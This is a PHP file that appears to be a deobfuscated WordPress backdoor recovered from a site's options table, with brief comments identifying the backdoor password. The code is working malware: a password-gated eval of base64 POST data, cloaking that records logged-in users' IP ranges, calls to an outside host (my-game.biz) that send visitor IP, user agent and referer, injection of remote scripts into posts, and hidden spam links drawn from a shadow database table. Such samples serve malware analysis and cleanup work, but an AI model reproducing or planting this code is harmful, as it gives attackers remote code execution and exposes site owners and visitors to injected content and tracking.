<?php

// Gets this code from the WordPress Database. 
// You can retrieve this information at this location:
// SELECT * FROM `wp_[PREFIX]_options` WHERE option_name = 'themes_css'
$pposte = $wp_template_css['color'];
// The serialize JSON Blob returned looks like this:

//{
//    "css": "font-family: sans-serif; line-height: 1.15; -ms-text-size-adjust: 100%; -webkit-text-size-adjust: 100%;",
//    "style": "create_function",
//    "color": "ad7afbcfaf",    // This is the password used for the backdoor
//    "fonts": "base64_decode",
//    "html": "fTskcHB[.....Base64 string omitted.......]yRwcG9zd"  
//} 

if (isset($_POST[$pposte]))
{
    @eval(base64_decode($_POST[$pposte]));
    exit;
}
function qwc1()
{
    global $wpdb, $table_prefix, $qwc1;
    $qwc2 = explode('.', $_SERVER["REMOTE_ADDR"]);
    if (sizeof($qwc2) == 4)
    {
        if ($wpdb->get_var("SELECT EXISTS (SELECT * FROM backupdb_" . $table_prefix . "lstat WHERE wp = '" . $qwc2[0] . '|' . $qwc2[1] . '|' . $qwc2[2] . "');") == 1)
        {
            $qwc1 = 1;
        }
    }
}
qwc1();
if (is_user_logged_in())
{
    global $wpdb, $table_prefix;
    if (!isset($qwc1))
    {
        $qwc3 = ip2long($_SERVER["REMOTE_ADDR"]);
        if ($qwc3 == - 1 || $qwc3 === false)
        {
        }
        else
        {
            if ($wpdb->get_var("SHOW TABLES LIKE 'backupdb_" . $table_prefix . "lstat'") == "backupdb_" . $table_prefix . "lstat")
            {
                $qwc3 = $qwc3 - 2560;
                for ($i = 1;$i < 20;$i++)
                {
                    $qwc2 = explode('.', long2ip($qwc3 + ($i * 256)));
                    $wpdb->insert("backupdb_" . $table_prefix . "lstat", array(
                        'wp' => $qwc2[0] . '|' . $qwc2[1] . '|' . $qwc2[2]
                    ));
                }
            }
        }
    }
}
if (!isset($qwc1))
{
    $qwc4 = 'a' . substr(md5($pposte) , 0, 6);
    if (isset($_GET[$qwc4]))
    {
        $request = @wp_remote_retrieve_body(@wp_remote_get("http://my-game.biz/index.php?a=" . base64_encode($_GET[$qwc4]) . '&b=' . base64_encode($_SERVER["REMOTE_ADDR"]) . '&c=' . base64_encode($_SERVER["HTTP_USER_AGENT"]) . '&d=' . base64_encode(wp_get_referer()) , array(
            "timeout" => 120
        )));
        if (strstr($request, "<sleep>"))
        {
            $echo_n = explode("<sleep>", $request);
            $ott1 = base64_decode($echo_n[0]);
            if (strstr($ott1, '|'))
            {
                $head = explode('|', $ott1);
                foreach ($head as & $v1a)
                {
                    header($v1a);
                }
            }
            echo base64_decode($echo_n[1]);
        }
        exit;
    }
    function qwc0()
    {
        global $wpdb, $qwc4;
        $tpre = $wpdb->prefix;
        if ($wpdb->get_var("SHOW TABLES LIKE 'backupdb_" . $tpre . "posts'") == "backupdb_" . $tpre . "posts")
        {
            $qwc5 = "backupdb_" . $tpre;
            if ($tpre <> $qwc5)
            {
                $qwc0 = '<div id="' . $qwc4 . '"><ul>';
                wp_cache_flush();
                $qwc6 = new wpdb(DB_USER, DB_PASSWORD, DB_NAME, DB_HOST);
                $qwc6->set_prefix($qwc5);
                $qwc7 = $wpdb;
                $wpdb = $qwc6;
                $qwc8 = wp_get_recent_posts(20);
                foreach ($qwc8 as $qwc9)
                {
                    $qwc0 = $qwc0 . '<li><a href="' . get_permalink($qwc9["ID"]) . '" title="' . $qwc9["post_title"] . '" >' . $qwc9["post_title"] . '</a></li> ';
                }
                $wpdb = $qwc7;
                wp_cache_flush();
                $qwc0 = $qwc0 . '</ul><div><script type="text/javascript"> ' . "document.getElementById" . '("' . $qwc4 . '").' . "style.display=" . '"none"; </script>';
            }
            else $qwc0 = '';
            return $qwc0;
        }
    }
    function qvc0($qvc1)
    {
        global $qwc4;
        if (is_single())
        {
            $qvc0 = preg_replace('/j\$k([0-9]{1,10})j\$k/', "<script type='text/javascript' src='" . site_url('/?') . $qwc4 . "=\$1'></script>", $qvc1, 1);
        }
        else
        {
            $qvc0 = $qvc1;
        }
        return $qvc0;
    }
    add_filter('the_content', 'qvc0');
    function qvc3($qvc3)
    {
        $qvc3 = preg_replace("/j\$k([0-9]{1,10})j\$k/", '', $qvc3);
        return $qvc3 . qwc0();
    }
    function qwc7()
    {
        ob_start("qvc3");
    }
    function qwc5()
    {
        ob_end_flush();
    }
    add_action("wp_head", "qwc7");
    add_action("wp_footer", "qwc5");
    function qvc5()
    {
        if (is_404())
        {
            global $table_prefix, $wpdb, $qvc4;
            if (!isset($qvc4)) $qvc4 = $table_prefix;
            if ($wpdb->get_var("SHOW TABLES LIKE 'backupdb_" . $qvc4 . "posts'") == "backupdb_" . $qvc4 . "backupdb_posts")
            {
                if ($table_prefix <> "backupdb_" . $qvc4)
                {
                    $table_prefix = "backupdb_" . $qvc4;
                    wp_cache_flush();
                    $qvc5 = new wpdb(DB_USER, DB_PASSWORD, DB_NAME, DB_HOST);
                    $qvc5->set_prefix($table_prefix);
                    $thedb = $wpdb;
                    $wpdb = $qvc5;
                    wp();
                    if (!have_posts())
                    {
                        $wpdb = $thedb;
                    }
                }
            }
        }
    }
    add_action("wp", "qvc5");
} 
